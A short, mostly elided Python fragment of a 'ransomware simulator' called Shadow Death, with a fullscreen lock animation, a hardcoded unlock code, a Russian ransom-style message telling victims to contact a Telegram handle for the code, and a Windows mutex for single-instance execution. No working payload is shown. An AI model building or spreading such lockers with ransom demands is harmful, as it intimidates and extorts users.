# -*- coding: utf-8 -*-
"""
SHADOW DEATH - RANSOMWARE SIMULATOR
Blue Background + Fast Fullscreen Death Animation
Code: 1234
"""
...
Чтобы получить код, напишите {TELEGRAM_CONTACT} (Telegram)"""
...
if __name__ == "__main__":
    ...
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "ShadowDeath_Ransomware_Mutex")
